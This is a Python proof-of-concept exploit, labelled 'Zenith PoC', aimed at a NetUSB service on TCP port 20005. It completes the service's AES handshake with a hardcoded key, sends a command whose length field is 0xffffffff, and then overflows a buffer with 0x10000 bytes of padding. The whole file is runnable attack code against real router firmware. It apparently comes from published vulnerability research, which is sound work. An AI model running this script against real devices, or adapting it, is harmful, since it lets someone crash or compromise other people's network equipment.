# Axel '0vercl0k' Souchet - September 17 2021
from Crypto.Cipher import AES
import socket
import struct
import argparse
import threading
import sys

le8 = lambda i: struct.pack('=B', i)
le32 = lambda i: struct.pack('<I', i)

netusb_port = 20005

def send_handshake(s, aes_ctx):
    # Version
    s.send(b'\x56\x04')
    # Send random data
    s.send(aes_ctx.encrypt(b'a' * 16))
    _ = s.recv(16)

    # Receive & send back the random numbers.
    challenge = s.recv(16)
    s.send(aes_ctx.encrypt(challenge))

def send_bus_name(s, name):
    length = len(name)
    assert length - 1 < 63
    s.send(le32(length))
    b = name
    if type(name) == str:
        b = bytes(name, 'ascii')
    s.send(b)

def create_connection(target, port, name):
    # first_aes_k = bytes.fromhex('a2353556541cfe44ec468248064de66c')
    # aes_ctx = AES.new(first_aes_k, AES.MODE_ECB)
    # second_aes_k = aes_ctx.decrypt(encrypted_second_aes_k)
    second_aes_k = bytes.fromhex('5c130b59d26242649ed488382d5eaecc')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    aes_ctx = AES.new(second_aes_k, AES.MODE_ECB)
    send_handshake(s, aes_ctx)
    send_bus_name(s, name)
    return s, aes_ctx

class TrasherThread(threading.Thread):
    def __init__(self, target):
        threading.Thread.__init__(self, name = 'trasher')
        self.target = target
        self.port = netusb_port
        self.overflow_event = threading.Event()
        self.overflow_done_event = threading.Event()
        self.overflow_content = None

    def overflow_and_wait(self, overflow_content):
      self.overflow_content = overflow_content
      self.overflow_event.set()
      self.overflow_done_event.wait()

    def run(self):
        s, aes_ctx = create_connection(self.target, self.port, self.name)
        # Send host command / opcode.
        s.send(le8(0xff))
        s.send(le8(0x51))
        # send length
        s.send(le32(0xff_ff_ff_ff))
        # Send A & B
        s.send(le32(0x11_22_33_44))
        self.overflow_event.wait()
        s.send(le32(0x55_66_77_88))
        # Send it.
        # First fill up our buffer.
        p = le8(0xaa) * (128 - 0x10)
        # Fill up overflow
        p += self.overflow_content
        s.send(p)
        self.overflow_done_event.set()
        s.close()

def main():
    parser = argparse.ArgumentParser('Zenith PoC')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    trasher = TrasherThread(args.target)
    trasher.start()
    overflow_payload = b'A' * 0x10_000
    trasher.overflow_and_wait(overflow_payload)
    print('Done')

main()